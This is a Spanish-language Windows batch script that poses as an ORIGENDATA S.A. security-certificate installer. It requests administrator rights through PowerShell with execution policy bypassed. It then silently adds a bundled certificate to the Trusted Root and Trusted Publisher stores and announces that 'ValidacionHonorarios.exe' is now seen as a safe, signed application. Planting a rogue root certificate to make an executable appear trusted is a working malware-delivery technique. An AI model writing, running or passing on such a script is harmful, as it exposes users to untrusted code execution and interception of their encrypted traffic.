@echo off
setlocal EnableDelayedExpansion
chcp 65001 >nul
cd /d "%~dp0"

echo =====================================================================
echo    INSTALADOR DE CERTIFICADO DE SEGURIDAD - ORIGENDATA S.A.
echo =====================================================================
echo.

:: Verificar si tenemos privilegios reales de Administrador
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [INFO] Solicitando permisos de Administrador de Windows...
    powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process cmd.exe -ArgumentList '/c ""%~f0""' -Verb RunAs"
    exit /b 0
)

set "CERT_FILE=%~dp0ORIGENDATA_Certificado.cer"

if not exist "%CERT_FILE%" (
    echo [ERROR] No se encontro el archivo: ORIGENDATA_Certificado.cer
    echo Asegurese de extraer todos los archivos antes de ejecutar.
    echo.
    pause
    exit /b 1
)

echo Instalando certificado en Entidades de Certificacion Raiz de Confianza...
certutil.exe -f -addstore "ROOT" "%CERT_FILE%" >nul 2>&1

echo Instalando certificado en Editores de Confianza...
certutil.exe -f -addstore "TrustedPublisher" "%CERT_FILE%" >nul 2>&1

:: Tambien agregamos al almacen del usuario actual por compatibilidad total
certutil.exe -f -user -addstore "ROOT" "%CERT_FILE%" >nul 2>&1
certutil.exe -f -user -addstore "TrustedPublisher" "%CERT_FILE%" >nul 2>&1

echo.
echo =====================================================================
echo  [EXITO] Certificado ORIGENDATA instalado correctamente en Windows.
echo.
echo  Ahora Windows 10 y Windows 11 reconocen ValidacionHonorarios.exe
echo  como una aplicacion segura y firmada por ORIGENDATA.
echo =====================================================================
echo.
pause
